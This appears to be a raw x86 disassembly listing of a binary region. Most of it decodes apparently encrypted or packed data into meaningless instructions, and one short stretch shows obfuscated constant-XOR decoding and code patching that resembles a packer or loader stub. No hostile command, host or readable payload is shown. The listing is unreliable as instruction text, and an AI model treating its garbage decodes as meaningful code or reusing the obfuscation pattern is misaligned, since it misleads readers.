  41fb61:	xor    DWORD PTR [ebx-0x12457db1],esp
  41fb67:	fsubr  st,st(6)
  41fb69:	add    eax,0x700a49c5
  41fb6e:	or     edi,DWORD PTR [eax]
  41fb70:	je     0x41fb95
  41fb72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb73:	cli    
  41fb74:	xor    BYTE PTR [ebp+0x51bc6201],bl
  41fb7a:	shl    DWORD PTR [ebp+0x1099891f],1
  41fb80:	jno    0x41fb8d
  41fb82:	mov    al,ds:0xe0720b72
  41fb87:	xor    BYTE PTR [edx+0x22879b28],bh
  41fb8d:	dec    esi
  41fb8e:	inc    ecx
  41fb8f:	loop   0x41fb9a
  41fb91:	mov    bl,0x2b
  41fb93:	cdq    
  41fb94:	scas   eax,DWORD PTR es:[edi]
  41fb95:	les    ebx,FWORD PTR [edx]
  41fb97:	cmp    DWORD PTR [eax+esi*8-0x1b827dea],eax
  41fb9e:	mov    dl,0x67
  41fba0:	or     al,0x7e
  41fba2:	add    al,BYTE PTR [eax+0x611774b2]
  41fba8:	push   es
  41fba9:	xor    ch,al
  41fbab:	cmp    dl,bl
  41fbad:	sbb    eax,0xb3ec791c
  41fbb2:	outs   dx,BYTE PTR ds:[esi]
  41fbb3:	arpl   WORD PTR [eax+0x4556647e],ax
  41fbb9:	push   edx
  41fbba:	jecxz  0x41fbdb
  41fbbc:	sub    eax,0xfc3ee21c
  41fbc1:	pop    ebp
  41fbc2:	int3   
  41fbc3:	les    esp,FWORD PTR [esi]
  41fbc5:	popa   
  41fbc6:	xor    DWORD PTR [ebx-0x20f683d3],ebp
  41fbcc:	ja     0x41fc36
  41fbce:	add    dl,0xc6
  41fbd1:	test   BYTE PTR ds:0xb190dcdb,ah
  41fbd7:	sub    cl,BYTE PTR [esi-0x80]
  41fbda:	leave  
  41fbdb:	jne    0x41fc54
  41fbdd:	add    DWORD PTR [esi+0x40],ebp
  41fbe0:	sbb    eax,0x68b93c92
  41fbe5:	nop
  41fbe6:	adc    esp,edx
  41fbe8:	push   ebx
  41fbe9:	ror    edi,0x11
  41fbec:	push   es
  41fbed:	dec    edi
  41fbee:	int3   
  41fbef:	dec    edx
  41fbf0:	loopne 0x41fc41
  41fbf2:	out    0x79,al
  41fbf4:	int    0x35
  41fbf6:	popf   
  41fbf7:	(bad)  
  41fbf9:	adc    edi,DWORD PTR [ecx+eiz*4-0x28658dd3]
  41fc00:	xchg   esi,eax
  41fc01:	adc    cl,BYTE PTR [ebx]
  41fc03:	xchg   ebx,eax
  41fc04:	adc    BYTE PTR [eax],ch
  41fc06:	or     eax,0xd3ddfc0d
  41fc0b:	sub    DWORD PTR [edx-0x7ffb79a],0xc0bdd411
  41fc15:	mov    ecx,0x44f9d0b4
  41fc1a:	adc    eax,0xc260b39c
  41fc1f:	in     eax,0xc8
  41fc21:	bound  esi,QWORD PTR [edx+0x8a60e9f]
  41fc27:	mov    ds:0x6f0d4fe2,eax
  41fc2c:	add    DWORD PTR [edi+0x7c3cc963],0xfba58819
  41fc36:	(bad)  [ebp+eiz*8+0x2b3531ce]
  41fc3d:	sbb    cl,BYTE PTR [ebp+0x52]
  41fc40:	ret    0xf851
  41fc43:	je     0x41fc4a
  41fc45:	mov    dh,0x6d
  41fc47:	cmp    BYTE PTR [eax],bl
  41fc49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc4a:	iret   
  41fc4b:	fcmovne st,st(0)
  41fc4d:	xchg   esp,eax
  41fc4e:	imul   edx,DWORD PTR [ecx],0xffffffed
  41fc51:	retf   
  41fc52:	sti    
  41fc53:	scas   al,BYTE PTR es:[edi]
  41fc54:	fistp  DWORD PTR ds:0x406eb96
  41fc5a:	xchg   ecx,eax
  41fc5b:	clc    
  41fc5c:	sbb    edx,DWORD PTR [eax]
  41fc5e:	mov    eax,ds:0x2ba88558
  41fc63:	pop    ss
  41fc64:	pop    ebp
  41fc65:	mov    eax,ds:0x89f9a79c
  41fc6a:	loop   0x41fcad
  41fc6c:	loopne 0x41fc8e
  41fc6e:	pop    es
  41fc6f:	cmp    al,0x70
  41fc71:	xchg   bh,cl
  41fc73:	loope  0x41fc9b
  41fc75:	jecxz  0x41fc2d
  41fc77:	(bad)  
  41fc78:	sbb    eax,0x8ae82173
  41fc7d:	in     al,dx
  41fc7e:	aam    0x7c
  41fc80:	pop    ds
  41fc81:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc83:	enter  0xf74a,0xd4
  41fc87:	jb     0x41fcb4
  41fc89:	pop    edi
  41fc8a:	lods   al,BYTE PTR ds:[esi]
  41fc8b:	into   
  41fc8c:	sete   BYTE PTR [ebp+0x2a3ca128]
  41fc93:	ins    DWORD PTR es:[edi],dx
  41fc94:	xor    BYTE PTR [ebx+ebp*2],bh
  41fc97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc98:	icebp  
  41fc99:	and    al,0x82
  41fc9b:	pop    edi
  41fc9c:	outs   dx,BYTE PTR ds:[esi]
  41fc9d:	fwait
  41fc9e:	sahf   
  41fc9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fca0:	test   eax,0x600da158
  41fca5:	jb     0x41fc7c
  41fca7:	cmp    al,0x51
  41fca9:	retf   
  41fcaa:	in     eax,0x7b
  41fcac:	jmp    0x2b6e:0xc04dd624
  41fcb3:	adc    ebx,DWORD PTR [ecx-0x6f2baefc]
  41fcb9:	xchg   BYTE PTR [edx+0x61e299b2],dh
  41fcbf:	rcl    DWORD PTR [esp+eiz*2+0x3],0xbe
  41fcc4:	or     ebp,DWORD PTR [ebx+0x6b]
  41fcc7:	ja     0x41fd32
  41fcc9:	lock push esi
  41fccb:	push   edi
  41fccc:	cmc    
  41fccd:	add    edi,DWORD PTR [eax-0x39]
  41fcd0:	add    eax,0xd52cb86b
  41fcd5:	mov    esi,0x39fbb2ce
  41fcda:	shr    dh,1
  41fcdc:	pop    esp
  41fcdd:	into   
  41fcde:	scas   al,BYTE PTR es:[edi]
  41fcdf:	clc    
  41fce0:	mov    bh,0xcc
  41fce2:	inc    ecx
  41fce3:	call   0xa6c34949
  41fce8:	in     al,0x48
  41fcea:	dec    eax
  41fceb:	inc    ebp
  41fcec:	jmp    0x41fcbd
  41fcee:	xchg   DWORD PTR ds:0x73d8dce9,esi
  41fcf4:	rcr    BYTE PTR [eax+0x2462c3db],1
  41fcfa:	daa    
  41fcfb:	ss mov ch,0x3e
  41fcfe:	push   edi
  41fcff:	xchg   BYTE PTR [eax+0x1ef25c21],bh
  41fd05:	in     eax,0x53
  41fd07:	inc    esi
  41fd08:	int3   
  41fd09:	ja     0x41fca8
  41fd0b:	pusha  
  41fd0c:	shr    BYTE PTR [ebp-0x4988f66],1
  41fd12:	rcl    ah,0x1d
  41fd15:	pop    edx
  41fd16:	push   cs
  41fd17:	jbe    0x41fc9c
  41fd19:	xor    DWORD PTR [eax+0x4a98282e],0x4c7a944b
  41fd23:	mov    dl,bl
  41fd25:	(bad)  
  41fd27:	addr16 pusha 
  41fd29:	stos   BYTE PTR es:[edi],al
  41fd2a:	cli    
  41fd2b:	add    DWORD PTR [edi],esi
  41fd2d:	jne    0x41fd01
  41fd2f:	ins    DWORD PTR es:[edi],dx
  41fd30:	imul   ebx,DWORD PTR [eax],0x2bd80266
  41fd36:	sub    edx,ecx
  41fd38:	add    DWORD PTR [edi],edx
  41fd3a:	dec    esi
  41fd3b:	cmp    esi,DWORD PTR [edx+edx*1]
  41fd3e:	mov    cl,0x7b
  41fd40:	daa    
  41fd41:	aaa    
  41fd42:	out    dx,eax
  41fd43:	xchg   ebx,eax
  41fd44:	pop    ds
  41fd45:	aad    0x4d
  41fd47:	pop    esp
  41fd48:	mov    ah,0xd4
  41fd4a:	inc    ecx
  41fd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd4c:	(bad)  
  41fd4e:	xchg   esp,eax
  41fd4f:	xor    DWORD PTR [esi],ebp
  41fd51:	mov    eax,ds:0xc04aae50
  41fd56:	pop    es
  41fd57:	cdq    
  41fd58:	mov    eax,ds:0x9a2466e6
  41fd5d:	out    0x27,al
  41fd5f:	(bad)  
  41fd60:	test   al,0xa8
  41fd62:	add    eax,0xccaec234
  41fd67:	mov    ds:0xae05a1ac,eax
  41fd6c:	outs   dx,BYTE PTR ds:[esi]
  41fd6d:	mov    cl,0xa
  41fd6f:	sub    DWORD PTR [esi],edx
  41fd71:	fabs   
  41fd73:	pop    esi
  41fd74:	xlat   BYTE PTR ds:[ebx]
  41fd75:	mul    BYTE PTR [edx+0x715dab89]
  41fd7b:	or     edi,DWORD PTR [esp+eax*2+0x1a]
  41fd7f:	mov    ebx,0x2e0d58e5
  41fd84:	leave  
  41fd85:	int3   
  41fd86:	jg     0x41fdaa
  41fd88:	and    BYTE PTR [ecx+ebp*8-0x11],cl
  41fd8c:	push   ecx
  41fd8e:	push   ss
  41fd8f:	sbb    BYTE PTR [ebx+0x1e439940],0xd4
  41fd96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd97:	mov    edx,0xa6430df3
  41fd9c:	cdq    
  41fd9d:	jle    0x41fd70
  41fd9f:	dec    ecx
  41fda0:	and    eax,0xbfbee91a
  41fda5:	or     al,0x4a
  41fda7:	xor    eax,0x463afe5c
  41fdac:	mov    al,ds:0x4562813d
  41fdb1:	dec    edx
  41fdb2:	or     DWORD PTR [ecx+0x2d05ead2],0x8b65b43b
  41fdbc:	imul   esi,DWORD PTR [ebx],0x41
  41fdbf:	or     esp,DWORD PTR [edx+eiz*8-0x5d]
  41fdc3:	sub    BYTE PTR [eax],ah
  41fdc5:	push   es
  41fdc6:	push   es
  41fdc7:	lahf   
  41fdc8:	(bad)  
  41fdc9:	adc    eax,0x311bfdad
  41fdce:	pop    eax
  41fdcf:	jno    0x41fd98
  41fdd1:	gs sub eax,0x1ee7352d
  41fdd7:	sar    DWORD PTR [edx-0x6d],cl
  41fdda:	adc    BYTE PTR [ebp-0x4b],cl
  41fddd:	fwait
  41fdde:	jo     0x41fdb0
  41fde0:	scas   al,BYTE PTR es:[edi]
  41fde1:	(bad)  
  41fde2:	mov    ebp,0xbe60af56
  41fde7:	dec    esi
  41fde8:	cwde   
  41fde9:	add    ebp,edi
  41fdeb:	or     BYTE PTR [edi],0x3f
  41fdee:	xchg   edx,eax
  41fdef:	inc    eax
  41fdf0:	fs pop ds
  41fdf2:	dec    edx
  41fdf3:	jg     0x41fd92
  41fdf5:	ds mov al,0x6f
  41fdf8:	pop    ecx
  41fdf9:	or     ebp,ebp
  41fdfb:	out    0xa4,eax
  41fdfd:	ja     0x41fda5
  41fdff:	mov    DWORD PTR [esi+0x13c1f5a0],esp
  41fe05:	and    eax,0x3992ce5e
  41fe0a:	mov    edi,0x6b4c6f16
  41fe0f:	cdq    
  41fe10:	mov    BYTE PTR [ecx-0x77fd2066],al
  41fe16:	push   ecx
  41fe17:	sbb    al,bh
  41fe19:	adc    esp,DWORD PTR [ebp-0x66e49f74]
  41fe1f:	mov    al,0x16
  41fe21:	sbb    al,0xa1
  41fe23:	mov    ebp,0x6c36ccb9
  41fe28:	ins    DWORD PTR es:[edi],dx
  41fe29:	scas   eax,DWORD PTR es:[edi]
  41fe2a:	sbb    bh,dl
  41fe2c:	xlat   BYTE PTR ds:[ebx]
  41fe2d:	(bad)  
  41fe2f:	jno    0x41fe6d
  41fe31:	int3   
  41fe32:	xchg   ebp,eax
  41fe33:	sbb    ebx,eax
  41fe35:	fld    DWORD PTR ds:0x9d243f3
  41fe3b:	or     eax,0x3dac8408
  41fe40:	rcr    esi,cl
  41fe42:	mov    bl,0xbf
  41fe44:	shr    BYTE PTR [edx+esi*4+0x42956a81],cl
  41fe4b:	clc    
  41fe4c:	test   al,0x40
  41fe4e:	pop    es
  41fe4f:	or     edi,DWORD PTR [edx+0x1e]
  41fe52:	lahf   
  41fe53:	sbb    ebp,DWORD PTR [esi]
  41fe55:	cs jp  0x41fe99
  41fe58:	mov    ebx,0xf6cd8fa1
  41fe5d:	mov    ds:0x24bc088e,al
  41fe62:	ss cmp edi,esi
  41fe65:	shl    DWORD PTR [edx-0x70c69ae4],0x48
  41fe6c:	mov    ds:0xd8197bc1,al
  41fe71:	inc    ebx
  41fe72:	hlt    
  41fe73:	add    DWORD PTR [eax-0x7f2ef244],ebp
  41fe79:	add    al,0x75
  41fe7b:	xchg   BYTE PTR [ecx],dh
  41fe7d:	repz xchg ebx,eax
  41fe7f:	js     0x41fe8b
  41fe81:	adc    ecx,DWORD PTR [ecx+0x40]
  41fe84:	add    DWORD PTR [ebx],edi
  41fe86:	popf   
  41fe87:	sbb    ecx,DWORD PTR ds:0x3188af7f
  41fe8d:	add    eax,0x2c2d0813
  41fe92:	das    
  41fe93:	jno    0x41ff12
  41fe95:	imul   ebp,DWORD PTR [ebx],0x4c
  41fe98:	jae    0x41fe40
  41fe9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe9b:	sub    cl,BYTE PTR [ebx-0x68]
  41fe9e:	loop   0x41fe8f
  41fea0:	mov    ebp,0xbf1d7d8
  41fea5:	imul   esi,DWORD PTR [ecx+0x78],0x5e
  41fea9:	mov    bl,0x64
  41feab:	enter  0x94c9,0xe2
  41feaf:	int    0x2b
  41feb1:	push   es
  41feb2:	ja     0x41fee4
  41feb4:	mov    ecx,0xe59fa55e
  41feb9:	adc    eax,0x13db1093
  41febe:	mov    al,ds:0x9c4c887e
  41fec3:	ins    DWORD PTR es:[edi],dx
  41fec4:	out    0x5d,al
  41fec6:	mov    al,ds:0x538d2809
  41fecb:	(bad)  
  41fecc:	js     0x41fec9
  41fece:	mov    dh,0x38
  41fed0:	jbe    0x41fed8
  41fed2:	pop    edx
  41fed3:	sub    bl,BYTE PTR [esi-0x14a5cc30]
  41fed9:	dec    ecx
  41feda:	jle    0x41feed
  41fedc:	sbb    al,0xc5
  41fede:	pusha  
  41fedf:	into   
  41fee0:	test   DWORD PTR [edx+0x6dc60978],ebp
  41fee6:	add    DWORD PTR [ecx-0x33],0x8988b126
  41feed:	fs jo  0x41fe7f
  41fef0:	daa    
  41fef1:	add    DWORD PTR [ecx-0x2e],edi
  41fef4:	test   BYTE PTR [eax],bl
  41fef6:	cmc    
  41fef7:	aaa    
  41fef8:	mov    eax,DWORD PTR [ecx+0x5f2e5e28]
  41fefe:	ror    bh,0x4d
  41ff01:	popf   
  41ff02:	mov    ecx,0x20c20ed
  41ff07:	fld    DWORD PTR [ecx-0x3a]
  41ff0a:	iret   
  41ff0b:	scas   eax,DWORD PTR es:[edi]
  41ff0c:	mov    dh,0xe3
  41ff0e:	xchg   ebp,eax
  41ff0f:	dec    ebx
  41ff10:	mov    ch,0xae
  41ff12:	xor    esi,0xffffffa2
  41ff15:	std    
  41ff16:	lea    ebx,[edx]
  41ff18:	push   es
  41ff19:	inc    eax
  41ff1a:	jmp    0xc629:0x2a6b063c
  41ff21:	cmp    al,0xb6
  41ff23:	mov    ebp,ss
  41ff25:	mov    ah,0x5c
  41ff27:	jecxz  0x41fef0
  41ff29:	mov    esi,ebx
  41ff2b:	or     edi,DWORD PTR [edx]
  41ff2d:	ins    DWORD PTR es:[edi],dx
  41ff2e:	fistp  WORD PTR [ebp-0x35]
  41ff31:	mov    esp,0xd6acc9d
  41ff36:	fdivr  st,st(4)
  41ff38:	lods   al,BYTE PTR ds:[esi]
  41ff39:	bound  edx,QWORD PTR [edx-0x29077255]
  41ff3f:	adc    edi,DWORD PTR [edx-0x59]
  41ff42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff43:	retf   0x75d9
  41ff46:	out    0x20,al
  41ff48:	lods   eax,DWORD PTR ds:[esi]
  41ff49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff4a:	sbb    BYTE PTR [ebx+0x6c],cl
  41ff4d:	lea    esp,[ebp-0x34d8ea3a]
  41ff53:	xchg   ecx,eax
  41ff54:	outs   dx,BYTE PTR ds:[esi]
  41ff55:	or     eax,0x885e711e
  41ff5a:	sub    ch,bh
  41ff5c:	mov    al,ds:0xf7e9eb24
  41ff61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff62:	(bad)  [eax+esi*1]
  41ff65:	pop    ds
  41ff66:	push   0x7031ba66
  41ff6b:	stos   DWORD PTR es:[edi],eax
  41ff6c:	out    dx,eax
  41ff6d:	push   edi
  41ff6e:	mov    ds:0xcd4c495d,eax
  41ff73:	jge    0x41ff42
  41ff75:	xchg   edi,eax
  41ff76:	add    DWORD PTR [esi],ebx
  41ff78:	dec    eax
  41ff79:	jmp    0x41ff8e
  41ff7b:	dec    esp
  41ff7c:	dec    esi
  41ff7d:	adc    ch,al
  41ff7f:	jecxz  0x41ffbe
  41ff81:	cmp    al,0x7
  41ff83:	lahf   
  41ff84:	inc    ecx
  41ff85:	push   ds
  41ff86:	sub    ecx,eax
  41ff88:	(bad)  
  41ff89:	scas   eax,DWORD PTR es:[edi]
  41ff8a:	mov    ecx,0x84a55df9
  41ff8f:	jno    0x41ffbd
  41ff91:	xchg   esi,eax
  41ff92:	stos   BYTE PTR es:[edi],al
  41ff93:	jb     0x41ffd0
  41ff95:	in     al,0xe1
  41ff97:	add    al,BYTE PTR [ecx-0x74]
  41ff9a:	ss jge 0x41ff94
  41ff9d:	js     0x41ff35
  41ff9f:	mov    eax,0x5a0ca0f3
  41ffa4:	aad    0x6a
  41ffa6:	loopne 0x41ffa2
  41ffa8:	mov    al,0x73
  41ffaa:	adc    BYTE PTR [edi-0x532ae5ed],0x11
  41ffb1:	push   eax
  41ffb2:	iret   
  41ffb3:	cmp    BYTE PTR [ebx],al
  41ffb5:	(bad)  
  41ffb6:	mov    ebx,0x28da39de
  41ffbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffbc:	jp     0x41ffc0
  41ffbe:	nop
  41ffbf:	push   edi
  41ffc0:	es jne 0x41ff5e
  41ffc3:	adc    ecx,DWORD PTR [ecx+0x7]
  41ffc6:	jge    0x420035
  41ffc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc9:	dec    ebx
  41ffca:	sahf   
  41ffcb:	inc    esp
  41ffcc:	fstp   TBYTE PTR ds:0xb6360a85
  41ffd2:	aas    
  41ffd3:	mov    ch,0x17
  41ffd5:	rcl    BYTE PTR [edx],0x81
  41ffd8:	mov    ebx,0x46edc570
  41ffdd:	push   ds
  41ffde:	xchg   ebx,eax
  41ffdf:	sub    dx,0xb579
  41ffe4:	enter  0xadb9,0x38
  41ffe8:	mov    al,ds:0x621ab58a
  41ffed:	clc    
  41ffee:	mov    edi,0xdb919621
  41fff3:	dec    esp
  41fff4:	(bad)
  41fff7:	and    cl,BYTE PTR [edi-0x1]
  41fffa:	mov    ecx,DWORD PTR [ebp-0x18]
  41fffd:	sub    eax,ecx
  41ffff:	mov    DWORD PTR [ebp-0x18],eax
  420002:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  420009:	mov    eax,DWORD PTR [ebp-0xc]
  42000c:	mov    ecx,DWORD PTR [ebp-0xc]
  42000f:	sub    eax,ecx
  420011:	mov    DWORD PTR [ebp-0xc],eax
  420014:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42001b:	mov    eax,DWORD PTR [ebp-0x1c]
  42001e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420021:	sub    eax,ecx
  420023:	mov    DWORD PTR [ebp-0x1c],eax
  420026:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42002d:	mov    eax,DWORD PTR [ebp-0x20]
  420030:	mov    ecx,DWORD PTR [ebp-0x20]
  420033:	sub    eax,ecx
  420035:	mov    DWORD PTR [ebp-0x20],eax
  420038:	mov    eax,DWORD PTR [ebp-0x2c]
  42003b:	mov    ecx,DWORD PTR [ebp-0x20]
  42003e:	mov    esi,0x75108ae
  420043:	xor    eax,esi
  420045:	mov    edi,0x3272f5
  42004a:	add    eax,edi
  42004c:	or     eax,ecx
  42004e:	mov    DWORD PTR [ebp-0x20],eax
  420051:	mov    eax,DWORD PTR [ebp-0x4]
  420054:	mov    ecx,DWORD PTR [ebp-0x4]
  420057:	sub    eax,ecx
  420059:	mov    DWORD PTR [ebp-0x4],eax
  42005c:	or     DWORD PTR [ebp-0x4],0xf89c85be
  420063:	mov    eax,DWORD PTR [ebp-0xc]
  420066:	xor    eax,esi
  420068:	add    eax,edi
  42006a:	push   eax
  42006b:	mov    eax,DWORD PTR [ebp-0x10]
  42006e:	xor    eax,esi
  420070:	add    eax,edi
  420072:	push   eax
  420073:	mov    eax,DWORD PTR [ebp-0x4]
  420076:	xor    eax,esi
  420078:	add    eax,edi
  42007a:	push   eax
  42007b:	lea    eax,[ebp-0x78]
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp-0x2c]
  420082:	push   DWORD PTR [ebp-0x28]
  420085:	call   0x40f76f
  42008a:	test   eax,eax
  42008c:	je     0x4200ba
  420092:	lea    eax,[ebp-0x78]
  420095:	push   eax
  420096:	mov    eax,DWORD PTR [ebp-0x28]
  420099:	xor    eax,esi
  42009b:	add    eax,edi
  42009d:	push   eax
  42009e:	mov    eax,DWORD PTR [ebp-0x24]
  4200a1:	add    eax,0xaa
  4200a6:	push   eax
  4200a7:	mov    eax,DWORD PTR [ebp-0x24]
  4200aa:	mov    eax,DWORD PTR [eax+0x198]
  4200b0:	push   DWORD PTR [eax]
  4200b2:	call   0x4061fa
  4200b7:	mov    DWORD PTR [ebp-0x14],eax
  4200ba:	mov    ecx,DWORD PTR ds:0x42a56a
  4200c0:	lea    eax,[ebp+0x4]
  4200c3:	mov    DWORD PTR [ecx*4+0x42a562],eax
  4200ca:	inc    DWORD PTR ds:0x42a56a
  4200d0:	mov    eax,DWORD PTR [ebp-0x14]
  4200d3:	test   eax,eax
  4200d5:	je     0x4224ce
  4200db:	lea    eax,[ebp-0x8]
  4200de:	mov    DWORD PTR [ebp-0x34],eax
  4200e1:	mov    eax,DWORD PTR [ebp-0x30]
  4200e4:	mov    DWORD PTR [ebp-0x8],eax
  4200e7:	mov    eax,DWORD PTR [ebp-0x8]
  4200ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4200ed:	sub    eax,ecx
  4200ef:	mov    DWORD PTR [ebp-0x8],eax
  4200f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4200f5:	xor    ecx,esi
  4200f7:	mov    eax,0xffcd8d0b
  4200fc:	sub    eax,ecx
  4200fe:	add    DWORD PTR [ebp-0x8],eax
  420101:	mov    eax,DWORD PTR [ebp-0x8]
  420104:	mov    ecx,DWORD PTR [ebp-0x14]
  420107:	mov    DWORD PTR [ecx+0x1],eax
  42010a:	mov    eax,DWORD PTR [ebp-0x14]
  42010d:	jmp    0x42249e
  420112:	adc    ebp,DWORD PTR [ebx]
  420114:	inc    BYTE PTR [eax-0x2a]
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	xchg   ecx,eax
  420119:	or     dh,bh
  42011b:	lahf   
  42011c:	cmp    eax,0xdd9ea20a
  420121:	ss push es
  420123:	mov    dh,0x80
  420125:	or     DWORD PTR [edi],0x5e
  420128:	add    DWORD PTR [ebx+0x4a3a3a8c],0xffffffd8
  42012f:	test   ebp,0xd18fc303
  420135:	hlt    
  420136:	adc    ecx,DWORD PTR [eax]
  420138:	stos   BYTE PTR es:[edi],al
  420139:	dec    esp
  42013a:	sti    
  42013b:	sub    al,0x8f
  42013d:	gs repz retf 0x7145
  420142:	pop    es
  420143:	call   DWORD PTR [ebx+0x2c]
  420146:	aas    
  420147:	out    dx,al
  420148:	(bad)  
  420149:	adc    DWORD PTR [ebx+0x29],eax
  42014c:	mov    al,ds:0xfcd02e63
  420151:	lods   eax,DWORD PTR ds:[esi]
  420152:	add    BYTE PTR [ebx-0x15a04098],bh
  420158:	js     0x4201c0
  42015a:	enter  0x2ce4,0x85
  42015e:	call   0x633b42bf
  420163:	jns    0x420198
  420165:	dec    ebx
  420166:	retf   
  420167:	mov    ds:0x8df5bed4,al
  42016c:	fisttp WORD PTR [ebx+0x54e3d6e0]
  420172:	and    ch,BYTE PTR [edi-0xc5c525e]
  420178:	mov    esi,0x821f47dd
  42017d:	cmc    
  42017e:	mov    esp,0x63c693b7
  420183:	jp     0x42013b
  420185:	sti    
  420186:	push   cs
  420187:	cdq    
  420188:	jmp    0x4186af07
  42018d:	mov    bl,0x49
  42018f:	jmp    0xce4a:0xcc591891
  420196:	mov    cl,ch
  420198:	das    
  420199:	xor    DWORD PTR [esi],0xfffffffc
  42019c:	and    DWORD PTR [ecx+0x443137e4],eax
  4201a2:	mov    bh,BYTE PTR [ebx]
  4201a4:	(bad)  
  4201a5:	je     0x42013f
  4201a7:	(bad)  
  4201a8:	or     ebx,DWORD PTR [eax-0x77]
  4201ab:	jnp    0x42022b
  4201ad:	mov    ebx,0xcf1346f2
  4201b2:	out    0x7e,eax
  4201b4:	cs daa 
  4201b6:	mov    esp,0x41276ab0
  4201bb:	ficom  DWORD PTR ds:0xd0251061
  4201c1:	inc    eax
  4201c2:	dec    ebx
  4201c3:	mov    esi,0x30f36fe
  4201c8:	std    
  4201c9:	in     eax,dx
  4201ca:	pop    eax
  4201cb:	dec    esi
  4201cc:	add    al,0x26
  4201ce:	xor    dh,BYTE PTR [ebx]
  4201d0:	xor    ah,dl
  4201d2:	xchg   DWORD PTR [ecx-0x74dc8c87],edx
  4201d8:	(bad)  
  4201d9:	sub    al,0x51
  4201db:	sbb    al,0x8f
  4201dd:	pop    ds
  4201de:	sbb    BYTE PTR [esi-0xd],cl
  4201e1:	fcmovbe st,st(5)
  4201e3:	mov    dl,0xe4
  4201e5:	jp     0x4201f2
  4201e7:	mov    bl,0x2c
  4201e9:	xor    ebp,DWORD PTR [edi+esi*1+0x14]
  4201ed:	jp     0x420204
  4201ef:	jb     0x420221
  4201f1:	js     0x42023a
  4201f3:	sub    eax,0x5948fccc
  4201f8:	into   
  4201f9:	xchg   esp,eax
  4201fa:	mov    ah,dl
  4201fc:	adc    bl,ah
  4201fe:	test   al,0x58
  420200:	jno    0x420208
  420202:	push   ds
  420203:	xor    edi,DWORD PTR [edi]
  420205:	jno    0x42020b
  420207:	mov    esp,0xb80662dc
  42020c:	stos   BYTE PTR es:[edi],al
  42020d:	push   ebp
  42020e:	jmp    0x663e465e
  420213:	je     0x420236
  420215:	(bad)  
  420216:	jge    0x42027e
  420218:	sub    esi,DWORD PTR [esi-0x6d]
  42021b:	fistp  QWORD PTR [ecx+edi*1-0x34]
  42021f:	hlt    
  420220:	cli    
  420221:	mov    eax,ds:0x41e53580
  420226:	and    eax,0x37c87629
  42022b:	call   0x12adeb03
  420230:	gs dec edx
  420232:	loop   0x42025d
  420234:	test   DWORD PTR [ebp-0x7c],ebp
  420237:	mov    dh,0x22
  420239:	data16 xchg BYTE PTR [edx+eiz*2+0x1575972b],ah
  420241:	fimul  WORD PTR [ebx]
  420243:	jnp    0x42026a
  420245:	pop    edx
  420246:	mov    bl,0x53
  420249:	data16 in al,dx
  42024b:	mov    bh,0x24
  42024d:	pop    esi
  42024e:	mov    ecx,0x9440d1a5
  420253:	in     al,dx
  420254:	push   0xffffff86
  420256:	mov    DWORD PTR [esi],esi
  420258:	inc    ebx
  420259:	pop    ds
  42025a:	dec    edi
  42025b:	or     DWORD PTR [esi+eax*8-0x7b],edi
  42025f:	in     eax,dx
  420260:	retf   0x738b
  420263:	bound  edx,QWORD PTR [ebp+0x7a8cfc95]
  420269:	adc    cl,dh
  42026b:	pop    esp
  42026c:	push   edx
  42026d:	out    0xf0,al
  42026f:	pop    eax
  420270:	sub    eax,0xd965f3fd
  420275:	mov    cl,0xcf
  420277:	or     eax,DWORD PTR [edi]
  420279:	pusha  
  42027a:	gs pop esi
  42027c:	sbb    edi,DWORD PTR [ebx-0x622c79dc]
  420282:	or     bl,BYTE PTR [ebp-0x11]
  420285:	mov    ds:0x23a9c895,eax
  42028a:	sti    
  42028b:	dec    edx
  42028c:	out    0xb6,al
  42028e:	(bad)  
  42028f:	lock and BYTE PTR [edx],dl
  420292:	xor    ebp,DWORD PTR gs:[eax+0x33c7ced9]
  420299:	sub    ebx,esi
  42029b:	fisttp WORD PTR [ecx-0x2212fe26]
  4202a1:	cld    
  4202a2:	loope  0x420314
  4202a4:	jae    0x420320
  4202a6:	adc    eax,0xb4ad2640
  4202ab:	pop    eax
  4202ac:	pop    edi
  4202ad:	mov    ah,0x3f
  4202af:	test   eax,0xd0a1f5a8
  4202b4:	jle    0x4202e0
  4202b6:	daa    
  4202b7:	fs push cs
  4202b9:	mov    ebx,0x874b68e8
  4202be:	rol    DWORD PTR [edx+0x9],cl
  4202c1:	mov    esp,esp
  4202c3:	sub    DWORD PTR [eax],0x96939cd5
  4202c9:	mov    eax,es
  4202cb:	rol    DWORD PTR [edx],0x18
  4202ce:	jmp    0x42030b
  4202d0:	jl     0x4202a6
  4202d2:	inc    eax
  4202d3:	scas   eax,DWORD PTR es:[edi]
  4202d4:	push   ecx
  4202d5:	push   edx
  4202d6:	lods   al,BYTE PTR ds:[esi]
  4202d7:	cld    
  4202d8:	pop    eax
  4202d9:	mov    DWORD PTR [eax-0x6f],edx
  4202dc:	inc    ebp
  4202dd:	lock jle 0x4202c3
  4202e0:	pop    esp
  4202e1:	sbb    al,0x2f
  4202e3:	adc    DWORD PTR [ebp-0x1e],edi
  4202e6:	imul   eax,DWORD PTR [edi-0x2d25e6f1],0xfffffff7
  4202ed:	push   eax
  4202ee:	add    DWORD PTR [esi-0x3a4a20a7],ebp
  4202f4:	push   0xffffffa5
  4202f6:	lods   al,BYTE PTR ds:[esi]
